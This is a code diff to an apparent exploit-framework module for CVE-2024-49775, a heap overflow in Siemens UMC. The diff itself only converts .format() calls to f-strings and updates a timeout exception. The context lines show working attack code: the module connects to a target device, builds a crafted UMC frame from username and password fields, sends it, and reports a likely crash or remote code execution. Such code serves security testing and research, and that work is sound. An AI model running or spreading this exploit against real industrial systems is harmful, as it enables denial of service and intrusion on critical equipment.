@@ -86,7 +86,7 @@ class Exploit(Exploit):
             print_info("Advisory: https://cert-portal.siemens.com/productcert/html/ssa-928433.html")
             return
 
-        print_status("[CVE-2024-49775] Targeting Siemens UMC at {}:{} ...".format(self.target, self.port))
+        print_status(f"[CVE-2024-49775] Targeting Siemens UMC at {self.target}:{self.port} ...")
         try:
             sock = socket.socket()
             sock.settimeout(10)
@@ -107,7 +107,7 @@ class Exploit(Exploit):
             umc_body        = tlv_user + tlv_pass
             umc_frame       = b"\x01\x01" + struct.pack("<H", len(umc_body)) + umc_body
 
-            print_status("[CVE-2024-49775] Sending UMC heap overflow ({} bytes) ...".format(len(umc_frame)))
+            print_status(f"[CVE-2024-49775] Sending UMC heap overflow ({len(umc_frame)} bytes) ...")
             sock.sendall(umc_frame)
 
             import time; time.sleep(0.5)
@@ -117,12 +117,12 @@ class Exploit(Exploit):
                     print_success("[CVE-2024-49775] Response received — check for auth error vs crash")
                 else:
                     print_success("[CVE-2024-49775] No response — heap overflow likely triggered device crash/RCE")
-            except socket.timeout:
+            except TimeoutError:
                 print_success("[CVE-2024-49775] Timeout after overflow — RCE or DoS likely triggered")
         except ConnectionRefusedError:
-            print_warning("[CVE-2024-49775] Port {} refused — UMC may use different port on this device".format(self.port))
+            print_warning(f"[CVE-2024-49775] Port {self.port} refused — UMC may use different port on this device")
         except Exception as exc:
-            print_error("[CVE-2024-49775] Error: {}".format(exc))
+            print_error(f"[CVE-2024-49775] Error: {exc}")
         finally:
             try:
                 sock.close()
